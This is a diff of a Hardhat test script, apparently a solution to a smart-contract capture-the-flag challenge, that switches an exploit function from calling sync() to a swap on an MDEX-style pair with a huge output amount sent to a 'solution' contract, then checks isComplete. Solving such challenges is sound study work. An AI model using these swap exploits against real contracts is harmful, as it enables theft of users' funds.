@@ -1,5 +1,4 @@
 const { ethers } = require("hardhat");
-const { address } = require("hardhat/internal/core/config/config-validation");
 const { expect } = require("chai");
 
 async function deploy(deployer) {
@@ -30,15 +29,15 @@ async function exploit(storage2Main, attacker) {
         .expliot(
             "0x2ec7574ace48108340e39e2a8f8d23c4156d8d2d6fb2f6c1c31561becd0e922b"
         );
-    // await mdexPair
-    //     .connect(attacker)
-    //     .swap(
-    //         "999999999999999999999999999999999999999999999999",
-    //         0,
-    //         solution.address,
-    //         "0x1234"
-    //     );
-    await mdexPair.connect(attacker).sync()
+    await mdexPair
+        .connect(attacker)
+        .swap(
+            "999999999999999999999999999999999999999999999999",
+            0,
+            solution.address,
+            "0x1234"
+        );
+    await storage2Main.connect(attacker).isComplete();
 
 }
 
